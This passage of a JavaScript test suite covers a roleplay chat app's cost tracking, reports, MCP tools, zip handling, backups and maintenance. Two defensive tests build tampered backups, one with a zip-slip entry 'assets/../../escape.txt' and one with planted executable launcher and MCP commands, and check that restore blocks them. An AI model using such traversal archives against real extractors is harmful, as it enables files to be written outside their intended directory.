  // 三家字段名不一样，统一成一套
  assert.deepEqual(normaliseUsage({ prompt_tokens: 100, completion_tokens: 20, total_tokens: 120 }), {
    promptTokens: 100,
    completionTokens: 20,
    totalTokens: 120,
    cachedTokens: 0,
  });
  assert.deepEqual(normaliseUsage({ input_tokens: 10, output_tokens: 5, cache_read_input_tokens: 8 }), {
    promptTokens: 10,
    completionTokens: 5,
    totalTokens: 15,
    cachedTokens: 8,
  });
  const openai = normaliseUsage({ prompt_tokens: 50, completion_tokens: 1, prompt_tokens_details: { cached_tokens: 30 } });
  assert.equal(openai.cachedTokens, 30);
  assert.equal(normaliseUsage({ promptTokenCount: 7, candidatesTokenCount: 3, totalTokenCount: 10 }).totalTokens, 10);
  assert.deepEqual(normaliseUsage(null), { promptTokens: 0, completionTokens: 0, totalTokens: 0, cachedTokens: 0 });

  // 缓存命中：100 万 token、输入价 20 元、缓存一折 → 省 18 元
  assert.equal(cacheSavings({ cachedTokens: 1_000_000, priceIn: 20, discount: 0.1 }), 18);
  assert.equal(cacheSavings({ cachedTokens: 0, priceIn: 20 }), 0);
  assert.equal(cacheSavings({ cachedTokens: 100, priceIn: null }), 0);

  const delta = estimationDelta(120, 100);
  assert.equal(delta.diff, 20);
  assert.equal(delta.percent, 20);
  assert.equal(estimationDelta(10, 0).percent, null);

  const days = fillDays([{ key: new Date().toISOString().slice(0, 10), turns: 3, cost: 1 }], 7);
  assert.equal(days.length, 7);
  assert.equal(days.at(-1).turns, 3);
  assert.equal(days[0].turns, 0);
  assert.ok(PRICE_PRESETS.length >= 5);
});

test('工具箱：花费记账 —— 按对话 / 角色 / 天汇总，预估与实际分开', async () => {
  const { db, cleanup } = makeTempDb();
  try {
    const store = createCostStore({ repo: db.repo });
    const providerParams = { p1: { priceIn: 20, priceOut: 100 }, p2: { priceIn: 2, priceOut: 8 } };
    const { cost } = createToolboxServices({
      settings: {},
      ports: { costStore: store, providerParams: (id) => providerParams[id] ?? {} },
    });

    // 第一轮：提供方真报了用量
    cost.record({
      chatId: 'chat-1',
      characterId: 'char-1',
      providerId: 'p1',
      model: 'big',
      kind: 'normal',
      usage: { promptTokens: 1_000_000, completionTokens: 100_000, totalTokens: 1_100_000 },
      reported: true,
      estPromptTokens: 900_000,
      estCompletionTokens: 120_000,
    });
    // 第二轮：提供方没报，用估算兜底
    cost.record({
      chatId: 'chat-1',
      characterId: 'char-2',
      providerId: 'p2',
      model: 'small',
      usage: { promptTokens: 1000, completionTokens: 100 },
      reported: false,
      estPromptTokens: 1000,
      estCompletionTokens: 100,
    });
    // 第三轮：命中缓存
    cost.record({
      chatId: 'chat-2',
      providerId: 'p1',
      model: 'big',
      usage: { promptTokens: 500_000, completionTokens: 0, cachedTokens: 400_000 },
      reported: true,
      estPromptTokens: 500_000,
      estCompletionTokens: 0,
    });

    const summary = cost.summary({});
    assert.equal(summary.totals.turns, 3);
    assert.equal(summary.totals.promptTokens, 1_501_000);
    assert.equal(summary.totals.cachedTokens, 400_000);
    assert.equal(summary.totals.reportedTurns, 2);
    assert.equal(summary.totals.estimatedTurns, 1);
    // 20 元/百万输入 + 100 元/百万输出：1M 输入 20 元、0.1M 输出 10 元
    assert.equal(summary.totals.cost, 20 + 10 + (1000 / 1e6) * 2 + (100 / 1e6) * 8 + 10);
    // 缓存省下：0.4M * 20 * (1-0.1) = 7.2
    assert.equal(summary.totals.cacheSavings, 7.2);
    assert.equal(summary.totals.prompt.estimated, 1_401_000);
    assert.equal(summary.totals.prompt.actual, 1_501_000);
    assert.equal(summary.totals.prompt.percent, -6.7);
    assert.ok(summary.byDay.length >= 14);
    assert.ok(summary.byModel.some((row) => row.model === 'big'));

    const chats = cost.byChat({});
    assert.equal(chats.total, 2);
    assert.equal(chats.items[0].chatId, 'chat-1');
    assert.equal(chats.items[0].turns, 2);

    const characters = cost.byCharacter({});
    assert.equal(characters.items[1].turns, 1);

    const filtered = cost.summary({ chatId: 'chat-2' });
    assert.equal(filtered.totals.turns, 1);

    // 价目表覆盖提供方自带的单价
    const pricing = cost.savePricing({ providerId: 'p1', model: 'big', priceIn: 10, priceOut: 40, cacheDiscount: 0.25 });
    assert.equal(pricing.priceIn, 10);
    assert.deepEqual(cost.pricesFor('p1', 'big'), { priceIn: 10, priceOut: 40, cacheDiscount: 0.25, currency: 'CNY', source: 'pricing' });
    // 按模型配的价只管那个模型，别的模型还是用提供方自带的价
    assert.deepEqual(cost.pricesFor('p1', 'other'), { priceIn: 20, priceOut: 100, cacheDiscount: 0.1, currency: 'CNY', source: 'provider' });
    // 模型名留空 = 这家所有模型的默认价
    cost.savePricing({ providerId: 'p1', model: '', priceIn: 5, priceOut: 15, cacheDiscount: 0.5 });
    assert.deepEqual(cost.pricesFor('p1', 'other'), { priceIn: 5, priceOut: 15, cacheDiscount: 0.5, currency: 'CNY', source: 'pricing' });
    // 具体模型优先于"这家默认价"
    assert.equal(cost.pricesFor('p1', 'big').priceIn, 10);
    assert.deepEqual(cost.pricesFor('p2', 'small'), { priceIn: 2, priceOut: 8, cacheDiscount: 0.1, currency: 'CNY', source: 'provider' });
    assert.equal(cost.listPricing().items.length, 2);
    assert.equal(cost.removePricing(pricing.id), true);
    assert.equal(cost.listPricing().items.length, 1);
    assert.equal(store.stats().turns, 3);
  } finally {
    cleanup();
  }
});

// ---------------------------------------------------------------- 工具箱 3.2 月度 / 年度报告

test('月度与年度报告：区间边界、连续天数、聚合与总结', () => {
  const now = new Date('2026-10-15T12:00:00+08:00');
  const month = normalisePeriod('month', null, now);
  assert.equal(month.period, '2026-10');
  assert.equal(month.from, new Date(2026, 9, 1, 0, 0, 0, 0).toISOString());
  assert.equal(month.to, new Date(2026, 10, 1, 0, 0, 0, 0).toISOString());
  assert.equal(normalisePeriod('year', '2025', now).from, new Date(2025, 0, 1).toISOString());
  assert.equal(normalisePeriod('all', 'whatever', now).from, null);
  // 12 月的下界要跨年
  assert.equal(normalisePeriod('month', '2026-12', now).to, new Date(2027, 0, 1).toISOString());

  assert.equal(longestStreak(['2026-10-01', '2026-10-02', '2026-10-03', '2026-10-05']), 3);
  assert.equal(longestStreak([]), 0);

  const report = buildReport(
    {
      usage: {
        totals: { turns: 4, promptTokens: 100, completionTokens: 50, totalTokens: 150, cachedTokens: 20, cost: 0.03, cacheSavings: 0.005, reportedTurns: 4, unpricedTurns: 0 },
        byCharacter: [
          { characterId: 'c1', name: '阿狸', turns: 3, tokens: 120, cost: 0.02 },
          { characterId: null, name: null, turns: 1, tokens: 30, cost: 0.01 },
        ],
        byModel: [{ model: 'm', turns: 4, tokens: 150, cost: 0.03 }],
        byDay: [
          { date: '2026-10-01', turns: 2, tokens: 100, cost: 0.02 },
          { date: '2026-10-02', turns: 2, tokens: 50, cost: 0.01 },
        ],
      },
      activity: {
        totals: { messages: 6, userWords: 30, assistantWords: 90, longestMessage: 40 },
        byDay: [
          { date: '2026-10-01', messages: 4, userWords: 20, assistantWords: 60 },
          { date: '2026-10-02', messages: 2, userWords: 10, assistantWords: 30 },
        ],
        byHour: [{ hour: 0, messages: 1 }, { hour: 1, messages: 2 }, { hour: 20, messages: 3 }],
        byWeekday: [{ weekday: 4, messages: 6 }],
      },
      chats: { fresh: 2, branches: 1 },
      creation: { cardsCreated: 1, cardsEdited: 2, cardVersions: 3, worldbooks: 1, presets: 0, memories: 1 },
      images: { done: 5, error: 1, active: 0 },
      charactersPlayed: 2,
    },
    month,
  );
  assert.equal(report.headline.turns, 4);
  assert.equal(report.headline.words, 120);
  assert.equal(report.headline.longestStreak, 2);
  assert.equal(report.usage.topCharacters[0].name, '阿狸');
  assert.equal(report.usage.topCharacters[1].name, '（未归属）');
  assert.equal(report.activity.peak.date, '2026-10-01');
  assert.equal(report.activity.nightMessages, 3);
  assert.equal(report.images.done, 5);
  assert.equal(report.activity.byDay.length, 31); // 十月 31 天，缺的日子补 0
  assert.ok(report.commentary.length >= 3);

  const annual = buildReport({ activity: { byDay: [{ date: '2026-03-02', messages: 5 }] } }, normalisePeriod('year', '2026', now));
  assert.equal(annual.activity.byDay.length, 12); // 年报按月，12 根
  assert.equal(annual.activity.byDay[2].messages, 5);
});

test('月度与年度报告：存储聚合（真 SQLite + 本地时区切分）', () => {
  const { db, cleanup } = makeTempDb();
  try {
    const repo = db.repo;
    const iso = (value) => new Date(value).toISOString();
    repo.run('INSERT INTO characters (id, name, spec_version, data, created_at, updated_at) VALUES (?, ?, ?, ?, ?, ?)', ['c1', '阿狸', 'v2', '{}', iso('2026-10-02T03:00:00Z'), iso('2026-10-02T03:00:00Z')]);
    repo.run('INSERT INTO chats (id, title, character_id, created_at, updated_at) VALUES (?, ?, ?, ?, ?)', ['ch1', '夜谈', 'c1', iso('2026-10-02T03:00:00Z'), iso('2026-10-02T03:00:00Z')]);
    repo.run('INSERT INTO chat_messages (id, chat_id, seq, role, character_id, content, created_at) VALUES (?, ?, ?, ?, ?, ?, ?)', ['m1', 'ch1', 1, 'user', null, '你好', iso('2026-10-02T03:00:00Z')]);
    repo.run('INSERT INTO chat_messages (id, chat_id, seq, role, character_id, content, created_at) VALUES (?, ?, ?, ?, ?, ?, ?)', ['m2', 'ch1', 2, 'assistant', 'c1', '你好呀', iso('2026-10-02T03:00:00Z')]);
    repo.run('INSERT INTO usage_log (id, chat_id, character_id, model, total_tokens, prompt_tokens, cost, reported, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)', ['u1', 'ch1', 'c1', 'm', 100, 60, 0.01, 1, iso('2026-10-02T03:00:00Z')]);
    repo.run('INSERT INTO comfy_runs (id, status, created_at, updated_at) VALUES (?, ?, ?, ?)', ['r1', 'done', iso('2026-10-02T03:00:00Z'), iso('2026-10-02T03:00:00Z')]);

    const { review } = createToolboxServices({ ports: { reviewStore: createReviewStore({ repo }) } });
    const periods = review.periods();
    assert.equal(periods.scopes.length, 3);
    assert.ok(periods.months.includes('2026-10'));
    const report = review.report({ scope: 'month', period: '2026-10' });
    assert.equal(report.headline.turns, 1);
    assert.equal(report.headline.tokens, 100);
    assert.equal(report.headline.messages, 2);
    assert.equal(report.headline.cardsPlayed, 1);
    assert.equal(report.headline.cardsCreated, 1);
    assert.equal(report.usage.topCharacters[0].name, '阿狸');
    assert.equal(report.images.done, 1);
  } finally {
    cleanup();
  }
});

// ---------------------------------------------------------------- 工具箱 3.2 MCP 服务器

test('MCP 服务器：三种返回模式 + 破坏性操作二次确认', async () => {
  const cards = [
    { id: 'c1', name: '琥珀', specVersion: 'v2', tags: ['狐狸'], favorite: true, updatedAt: '2026-10-01T00:00:00Z', data: { description: '店里的白狐，怕生', personality: '傲娇' } },
    { id: 'c2', name: '阿狸', specVersion: 'v2', tags: [], favorite: false, updatedAt: '2026-10-02T00:00:00Z', data: { description: '会算数的猫' } },
  ];
  const chats = [{ id: 'chat-1', title: '酒馆夜谈', messageCount: 2, isGroup: false, lastMessage: '喵。', updatedAt: '2026-10-02T00:00:00Z' }];
  const messages = [
    { id: 'm1', seq: 1, role: 'user', name: '我', content: '你在吗' },
    { id: 'm2', seq: 2, role: 'assistant', name: '琥珀', content: '白狐抬头看了你一眼。' },
  ];
  const books = [{ id: 'wb1', name: '雪夜世界书' }];
  const entries = [
    { uid: 'e1', comment: '雪夜', keys: ['雪'], content: '这座城市常年下雪。', enabled: true },
    { uid: 'e2', comment: '旧书店', keys: ['书店'], content: '转角有家旧书店。', enabled: true },
  ];
  const saved = [];
  const removed = [];
  const updates = [];
  const services = {
    cards: {
      // 和真实存储一样：名字和卡内容都搜
      list: async ({ q = '' } = {}) => {
        const needle = String(q).toLowerCase();
        const items = cards.filter((card) => !needle || card.name.toLowerCase().includes(needle) || JSON.stringify(card.data ?? {}).toLowerCase().includes(needle));
        return { items, total: items.length };
      },
      get: async (id) => cards.find((card) => card.id === id) ?? null,
      stats: async () => ({ total: 2, favorites: 1, tags: ['狐狸'] }),
    },
    chat: {
      list: async () => ({ items: chats, total: chats.length }),
      get: async (id) => chats.find((item) => item.id === id) ?? null,
      messages: async () => ({ items: messages, total: messages.length }),
      update: async (id, patch) => {
        updates.push({ id, patch });
        return { ...chats[0], ...patch };
      },
      async *send() {
        yield { type: 'delta', text: '白' };
        yield { type: 'delta', text: '狐' };
        yield { type: 'done', messageId: 'm3', text: '白狐', usage: { promptTokens: 5, completionTokens: 2 } };
      },
    },
    worldbook: {
      list: async () => ({ items: books, total: 1 }),
      get: async (id) => books.find((book) => book.id === id) ?? null,
      entries: async () => ({ items: entries, total: entries.length }),
      saveEntry: async (bookId, entry) => {
        saved.push({ bookId, entry });
        return { uid: entry.uid || 'e-new' };
      },
      removeEntry: async (bookId, uid) => {
        removed.push({ bookId, uid });
        return true;
      },
    },
    prompts: {
      listPresets: async () => ({ items: [{ id: 'p1', name: '默认预设', kind: 'chat', data: { prompts: [{ name: 'a' }, { name: 'b' }] } }], total: 1 }),
      getPreset: async (id) => (id === 'p1' ? { id: 'p1', name: '默认预设', data: { prompts: [{ name: 'a' }] } } : null),
    },
    cost: { summary: async () => ({ totals: { turns: 3, cost: 0.5, totalTokens: 900 } }) },
  };
  const server = createTavernMcpServer({
    services,
    stores: { xrayList: () => [{ id: 'x1', createdAt: 'now', model: 'mock', tokens: { total: 42 }, sections: [{ id: 's1', title: '系统', tokens: 10, source: 'system', content: '你是琥珀' }] }] },
    repo: {},
    version: '9.9.9',
  });

  const tools = server.listTools();
  assert.equal(tools.length, server.toolCount);
  assert.ok(tools.length >= 12);
  assert.ok(tools.every((tool) => tool.name && tool.description && tool.inputSchema));
  assert.deepEqual(MCP_RETURN_MODES.map((mode) => mode.id), ['summary', 'search', 'index']);
  assert.ok(tools.find((tool) => tool.name === 'worldbook.saveEntry').annotations.destructiveHint);

  const parse = (result) => JSON.parse(result.content[0].text);

  // 三种模式给的信息量递增（省 token 的核心）
  const summary = parse(await server.callTool('cards.list', {}));
  assert.deepEqual(Object.keys(summary[0]), ['id', 'name']);
  const index = parse(await server.callTool('cards.list', { mode: 'index' }));
  assert.equal(index[0].name, '琥珀');
  assert.deepEqual(index[0].tags, ['狐狸']);
  const search = parse(await server.callTool('cards.list', { mode: 'search', query: '白狐' }));
  assert.equal(search[0].match, true);
  assert.ok(search[0].description.length <= 161);

  const card = parse(await server.callTool('cards.get', { id: 'c1', mode: 'index' }));
  assert.equal(card.name, '琥珀');
  assert.ok((await server.callTool('cards.get', { id: 'nope' })).isError);

  // 查对话：summary 只给条数与角色分布
  const chatSummary = parse(await server.callTool('chats.messages', { chatId: 'chat-1' }));
  assert.equal(chatSummary.total, 2);
  assert.deepEqual(chatSummary.roles, { user: 1, assistant: 1 });
  const chatSearch = parse(await server.callTool('chats.messages', { chatId: 'chat-1', mode: 'search', query: '白狐' }));
  assert.equal(chatSearch.hits.length, 1);

  // 破坏性操作：不带 confirm 只给提示、不落库
  const needConfirm = await server.callTool('worldbook.saveEntry', { bookId: 'wb1', content: '新的条目' });
  assert.equal(needConfirm.isError, true);
  assert.match(needConfirm.content[0].text, /confirm: true/);
  assert.equal(saved.length, 0);

  const okSave = parse(await server.callTool('worldbook.saveEntry', { bookId: 'wb1', content: '新的条目', uid: 'e1', confirm: true }));
  assert.equal(okSave['uid'], 'e1');
  assert.equal(saved.length, 1);
  assert.equal(saved[0].entry.content, '新的条目');

  await server.callTool('worldbook.removeEntry', { bookId: 'wb1', uid: 'e2' });
  assert.equal(removed.length, 0, '不带 confirm 不能删');
  const okRemove = parse(await server.callTool('worldbook.removeEntry', { bookId: 'wb1', uid: 'e2', confirm: true }));
  assert.equal(okRemove.ok, true);
  assert.equal(removed[0].uid, 'e2');

  // 切预设：真的写进 chat.settings.presetId
  const needConfirmPreset = await server.callTool('presets.use', { chatId: 'chat-1', presetId: 'p1' });
  assert.equal(needConfirmPreset.isError, true);
  assert.equal(updates.length, 0);
  const usedPreset = parse(await server.callTool('presets.use', { chatId: 'chat-1', presetId: 'p1', confirm: true }));
  assert.equal(usedPreset.presetId, 'p1');
  assert.equal(updates[0].patch.settings.presetId, 'p1');
  assert.ok((await server.callTool('presets.use', { chatId: 'chat-1', presetId: 'nope', confirm: true })).isError);

  // 发消息：要 confirm，确认后返回模型正文
  const needConfirmSend = await server.callTool('chats.send', { chatId: 'chat-1', text: '在吗' });
  assert.equal(needConfirmSend.isError, true);
  const sent = parse(await server.callTool('chats.send', { chatId: 'chat-1', text: '在吗', confirm: true }));
  assert.equal(sent.text, '白狐');
  assert.equal(sent.messageId, 'm3');

  // 世界书与 X 光机
  const entryIndex = parse(await server.callTool('worldbook.entries', { bookId: 'wb1', mode: 'index' }));
  assert.equal(entryIndex.total, 2);
  assert.deepEqual(entryIndex.entries[0].keys, ['雪']);
  const xray = parse(await server.callTool('prompts.xray', { chatId: 'chat-1', mode: 'index' }));
  assert.equal(xray[0].tokens.total, 42);
  assert.match(xray[0].sections[0].content, /琥珀/);

  const overview = parse(await server.callTool('stats.overview', {}));
  assert.equal(overview.cards, 2);
  assert.equal(overview.chats, 1);
  assert.equal(overview.usage.turns, 3);
  assert.equal(overview.version, '9.9.9');

  const unknown = await server.callTool('nope.nope', {});
  assert.equal(unknown.isError, true);
  assert.match(unknown.content[0].text, /没有这个工具/);
});

// ---------------------------------------------------------------- 工具箱 3.2 备份与维护

test('工具箱：zip 读写（只用 node:zlib）', () => {
  const entries = [
    { name: 'tavern.db', data: Buffer.from('假装这是数据库', 'utf8') },
    { name: 'assets/ast_1.png', data: Buffer.from([1, 2, 3, 4, 5]) },
    { name: 'manifest.json', data: JSON.stringify({ hello: 'world' }) },
    { name: 'big.txt', data: 'abcabcabc'.repeat(500) },
  ];
  const zip = createZip(entries);
  assert.ok(Buffer.isBuffer(zip));
  assert.equal(zip.subarray(0, 4).toString('hex'), '504b0304', 'zip 本地头签名');
  assert.equal(zip.subarray(zip.length - 22, zip.length - 18).toString('hex'), '504b0506', 'zip 结尾签名');

  const read = readZip(zip);
  assert.equal(read.length, 4);
  const byName = new Map(read.map((entry) => [entry.name, entry.data]));
  assert.equal(byName.get('tavern.db').toString('utf8'), '假装这是数据库');
  assert.deepEqual([...byName.get('assets/ast_1.png')], [1, 2, 3, 4, 5]);
  assert.equal(JSON.parse(byName.get('manifest.json').toString('utf8')).hello, 'world');
  assert.equal(byName.get('big.txt').length, 4500);
  // 中文文件名也要能原样回来
  const named = readZip(createZip([{ name: '素材/立绘.png', data: Buffer.from('x') }]));
  assert.equal(named[0].name, '素材/立绘.png');

  assert.throws(() => readZip(Buffer.from('这不是压缩包')), /zip/);
});

test('工具箱：备份 —— 快照、清单、恢复、保留份数', async () => {
  const { db, dir, cleanup } = makeTempDb();
  try {
    const store = createChatStore({ repo: db.repo });
    const assets = createAssetStore({ repo: db.repo, dataDir: dir });
    const backupStore = createBackupStore({ rawDb: db.db, repo: db.repo, dataDir: dir, logger: silentLogger });

    // 造点数据：一个对话 + 一张素材 + 一份设置
    const chat = store.createChat({ title: '备份测试', character: { name: '琥珀', first_mes: '你好。' } });
    store.appendMessage(chat.id, { role: 'assistant', name: '琥珀', content: '备份之前的一条消息' });
    const asset = assets.save({ buffer: Buffer.from('图片字节'), mime: 'image/png', name: 'test.png' });
    db.repo.run("INSERT OR REPLACE INTO settings (key, value, updated_at) VALUES ('ui.theme', '\"dark\"', '2026-10-03T00:00:00Z')");

    const made = backupStore.create({ label: '测试备份', kind: 'manual' });
    assert.ok(made.name.startsWith('tavern-'));
    assert.ok(made.bytes > 0);
    assert.equal(made.stats.chats, 1);
    assert.equal(made.stats.assets, 1);
    assert.equal(made.assetFiles, 1);
    assert.ok(existsSync(path.join(dir, 'backups', `${made.name}.zip`)));

    const list = backupStore.list();
    assert.equal(list.length, 1);
    assert.equal(list[0].label, '测试备份');
    assert.equal(list[0].stats.chats, 1);
    const described = describeBackups([
      { name: 'a', createdAt: '2026-01-01T00:00:00Z', bytes: 2048, kind: 'auto' },
      { name: 'b', createdAt: '2026-02-01T00:00:00Z', bytes: 10, kind: 'manual' },
    ]);
    assert.equal(described[0].name, 'b');
    assert.equal(described[0].latest, true);
    assert.equal(described[0].kindTitle, '手动备份');
    assert.equal(described[1].sizeText, '2.0 KB');
    assert.equal(formatBytes(0), '0 B');

    // 备份里的库要能读出来（VACUUM INTO 出来的快照 + zip 往返都通了）
    const entries = readZip(readFileSync(path.join(dir, 'backups', `${made.name}.zip`)));
    const manifest = JSON.parse(entries.find((entry) => entry.name === 'manifest.json').data.toString('utf8'));
    assert.equal(manifest.label, '测试备份');
    assert.ok(manifest.files.includes(`assets/${path.basename(asset.path)}`));

    // 破坏现状：改标题、删消息、删素材、改设置
    store.updateChat(chat.id, { title: '被改坏的标题' });
    store.deleteMessage(chat.id, store.listMessages(chat.id).at(-1).id);
    assets.remove(asset.id);
    db.repo.run("UPDATE settings SET value = '\"light\"' WHERE key = 'ui.theme'");

    const restored = backupStore.restore({ name: made.name });
    assert.equal(restored.ok, true);
    assert.ok(restored.tables > 10, `恢复的表太少：${restored.tables}`);
    assert.equal(restored.foreignKeyIssues, 0);
    assert.ok(restored.safetyBackup, '恢复前应该自动留一份');
    assert.equal(store.getChat(chat.id).title, '备份测试');
    assert.equal(store.listMessages(chat.id).length, 1, '被删掉的那条消息要回来');
    assert.ok(assets.get(asset.id), '素材文件要跟着回来');
    assert.equal(db.repo.get("SELECT value FROM settings WHERE key = 'ui.theme'").value, '"dark"');

    // 保留份数
    backupStore.create({ label: '第二份', kind: 'auto' });
    backupStore.create({ label: '第三份', kind: 'auto' });
    // 1 份手动 + 恢复前自动留的 1 份 + 刚加的两份
    assert.equal(backupStore.list().length, 4);
    const pruned = backupStore.prune(1);
    assert.equal(pruned.removed.length, 3);
    assert.equal(backupStore.list().length, 1);
    assert.ok(backupStore.remove(backupStore.list()[0].name));
    assert.equal(backupStore.list().length, 0);

    assert.throws(() => backupStore.restore({ name: 'nope' }), ValidationError);
  } finally {
    cleanup();
  }
});

test('备份恢复：没有 launcher 的租户不能把可执行配置（launcher / 本地 MCP）恢复回来', async () => {
  const { db, dir, cleanup } = makeTempDb();
  try {
    const masterKey = Buffer.from('0'.repeat(64), 'hex');

    // 造一份"被人为改过"的备份：里面有一家带 launcher 的提供方 + 一条本地 MCP 服务器
    const source = createBackupStore({ rawDb: db.db, repo: db.repo, dataDir: dir, logger: silentLogger, allowExecutableConfig: true });
    const provider = createProvider(db.repo, masterKey, {
      label: '本地代理',
      kind: 'chat',
      adapter: 'openai',
      baseUrl: 'http://127.0.0.1:1/v1',
      launcher: { command: 'echo', args: ['x'], cwd: '.' },
    });
    db.repo.run(
      "INSERT INTO mcp_servers (id, name, command, args, env, enabled, auto_connect, created_at, updated_at) VALUES ('m1','坏东西','node','[\"-e\",\"x\"]','{}',1,0,?,?)",
      [nowIso(), nowIso()],
    );
    const made = source.create({ label: '带可执行配置', kind: 'manual' });
    assert.ok(getProvider(db.repo, provider.id).launcher, '前置：备份里的提供方带着启动命令');

    // 恢复进一个"没有 launcher"的租户（= 多用户模式下的成员）
    const member = createBackupStore({ rawDb: db.db, repo: db.repo, dataDir: dir, logger: silentLogger, allowExecutableConfig: false });
    const result = member.restore({ name: made.name });
    assert.equal(result.ok, true);
    assert.equal(getProvider(db.repo, provider.id)?.launcher ?? null, null, '没有 launcher 的租户恢复后不能留下启动命令');
    assert.equal(db.repo.get('SELECT COUNT(*) AS n FROM mcp_servers').n, 0, '本地 MCP 服务器也不能被恢复带回来');
  } finally {
    cleanup();
  }
});

test('工具箱：备份里的越界条目不能把文件写到数据目录外面', async () => {
  const { db, dir, cleanup } = makeTempDb();
  try {
    const store = createChatStore({ repo: db.repo });
    const backupStore = createBackupStore({ rawDb: db.db, repo: db.repo, dataDir: dir, logger: silentLogger });
    store.createChat({ title: '正常的备份' });
    const made = backupStore.create({ label: '正常备份', kind: 'manual' });

    // 手工改包：塞一个想往上跑的条目（`assets/../../escape.txt`）
    const entries = readZip(readFileSync(path.join(dir, 'backups', `${made.name}.zip`)));
    const manifest = entries.find((entry) => entry.name === 'manifest.json');
    const evil = createZip([
      ...entries.filter((entry) => entry.name !== 'manifest.json'),
      { name: 'assets/../../escape.txt', data: Buffer.from('pwned') },
      manifest,
    ]);
    // 导入这条路直接拒绝
    assert.throws(() => backupStore.adoptZip({ buffer: evil, label: '改过的备份' }), ValidationError);

    // 就算绕过导入、把包直接塞进备份目录，恢复时也不能写出去
    writeFileSync(path.join(dir, 'backups', 'evil.zip'), evil);
    writeFileSync(path.join(dir, 'backups', 'evil.meta.json'), JSON.stringify({ name: 'evil', label: 'evil', kind: 'imported' }));
    const restored = backupStore.restore({ name: 'evil' });
    assert.equal(restored.files.skipped, 1, '越界条目要被跳过并计数');
    assert.ok(!existsSync(path.join(dir, 'escape.txt')));
    assert.ok(!existsSync(path.resolve(dir, '..', 'escape.txt')), '不能写到数据目录的上一级');
  } finally {
    cleanup();
  }
});

test('工具箱：数据体检与清理', async () => {
  const { db, dir, cleanup } = makeTempDb();
  try {
    const store = createChatStore({ repo: db.repo });
    const assets = createAssetStore({ repo: db.repo, dataDir: dir });
    const maintenance = createMaintenanceStore({ repo: db.repo, dataDir: dir });

    const chat = store.createChat({ title: '维护测试', character: { name: '琥珀', first_mes: '你好。' } });
    store.appendMessage(chat.id, { role: 'user', name: '我', content: '一二三四五' });
    const stats = maintenance.stats();
    assert.equal(stats.chats, 1);
    assert.equal(stats.messages, 1, '直接调 store 建对话不会自动写开场白，所以只有刚追加的那一条');
    assert.ok(stats.words >= 5);
    assert.ok(describeStats(stats).some((item) => item.label === '角色卡' && item.value === 0));
    assert.equal(describeStats({ assetBytes: 2048 }).find((item) => item.key === 'assetBytes').value, '2.0 KB');
    assert.ok(CLEANUP_TARGETS.some((item) => item.id === 'staleVectors'));
    assert.equal(CLEANUP_TARGETS.find((item) => item.id === 'emptyChats').default, false);

    // 孤立文件：磁盘上有、库里没有
    const asset = assets.save({ buffer: Buffer.from('有名有姓'), mime: 'image/png', name: 'keep.png' });
    writeFileSync(path.join(dir, 'assets', 'orphan.png'), Buffer.from('没人管的文件'));
    // 失效向量：指向一个不存在的对话；有效向量：指向真实素材
    db.repo.run(
      "INSERT INTO vector_items (id, collection, source_id, chunk_index, content, updated_at) VALUES ('v1', 'history', 'chat-已经删了', 0, '没用的片段', '2026-10-03T00:00:00Z')",
    );
    db.repo.run(
      "INSERT INTO vector_items (id, collection, source_id, chunk_index, content, updated_at) VALUES ('v2', 'history', ?, 0, '有效片段', '2026-10-03T00:00:00Z')",
      [chat.id],
    );
    // 重复消息 + 空对话
    const repeated = '这条说了两遍，重复导入最容易出现';
    store.appendMessage(chat.id, { role: 'user', name: '我', content: repeated });
    store.appendMessage(chat.id, { role: 'user', name: '我', content: repeated });
    store.createChat({ title: '空的', greetings: false, members: [] });

    const scan = maintenance.scan();
    assert.equal(scan.details.orphanFiles.length, 1);
    assert.equal(scan.issues.find((item) => item.id === 'staleVectors').count, 1);
    assert.equal(scan.details.duplicateMessages.length, 1);
    assert.equal(scan.details.duplicateMessages[0].removeIds.length, 1);
    assert.equal(scan.issues.find((item) => item.id === 'emptyChats').count, 1);

    const cleaned = maintenance.cleanup({ plan: scan });
    assert.equal(cleaned.removed.orphanFiles, 1);
    assert.equal(cleaned.removed.staleVectors, 1);
    assert.equal(cleaned.removed.duplicateMessages, 1);
    assert.equal(cleaned.removed.emptyChats, 0, '空对话默认不清理');
    assert.ok(cleaned.bytesFreed > 0);

    const after = maintenance.scan();
    assert.equal(after.issues.find((item) => item.id === 'orphanFiles').count, 0);
    assert.equal(after.issues.find((item) => item.id === 'staleVectors').count, 0);
    assert.equal(after.issues.find((item) => item.id === 'duplicateMessages').count, 0);
    assert.equal(after.issues.find((item) => item.id === 'emptyChats').count, 1);
    assert.equal(db.repo.get("SELECT COUNT(*) AS n FROM vector_items WHERE id = 'v2'").n, 1, '有效的向量不能被误删');
    assert.equal(store.listMessages(chat.id).filter((message) => message.content === repeated).length, 1);
  } finally {
    cleanup();
  }
});

test('工具箱：定时任务 —— 下次运行时间、到点判断、重启后不重复跑', () => {
  const now = new Date(2026, 9, 3, 10, 0, 0); // 本地时间 2026-10-03 10:00
  const yesterday = new Date(2026, 9, 2, 4, 0, 0);

  const daily = normaliseTask(
    { kind: 'backup', enabled: true, every: 'daily', atHour: 4, atMinute: 0, createdAt: yesterday.toISOString(), lastRunAt: yesterday.toISOString() },
    now,
  );
  // 昨天 4 点跑过，今天 4 点已经过了 → 该跑了（停机错过的会补一次）
  assert.equal(isDue(daily, now), true);
  assert.equal(nextRunAt(daily, now).getTime(), new Date(2026, 9, 4, 4, 0, 0).getTime());
  // 刚才跑过 → 同一个时间点不会再跑第二遍
  assert.equal(isDue({ ...daily, lastRunAt: now.toISOString() }, now), false);
  // 停用的一律不跑
  assert.equal(isDue({ ...daily, enabled: false }, now), false);
  // 新建、还没到点的不跑（createdAt 是锚点）
  const fresh = normaliseTask({ kind: 'backup', enabled: true, every: 'daily', atHour: 4, atMinute: 0 }, now);
  assert.equal(fresh.createdAt, now.toISOString());
  assert.equal(isDue(fresh, now), false, '刚建的任务要等下一个时间点，不能立刻动数据');
  assert.equal(nextRunAt(fresh, now).getTime(), new Date(2026, 9, 4, 4, 0, 0).getTime());

  // 每周：算到下一个指定星期几
  const weekly = normaliseTask({ kind: 'cleanup', enabled: true, every: 'weekly', weekday: 0, atHour: 4, atMinute: 30 }, now);
  const delta = (0 - now.getDay() + 7) % 7 || 7;
  assert.equal(nextRunAt(weekly, now).getTime(), new Date(2026, 9, 3 + delta, 4, 30, 0).getTime());
  assert.equal(frequencyText(weekly), '每周日 04:30');
  assert.equal(frequencyText(daily), '每天 04:00');

  // 定时总结必须绑定对话
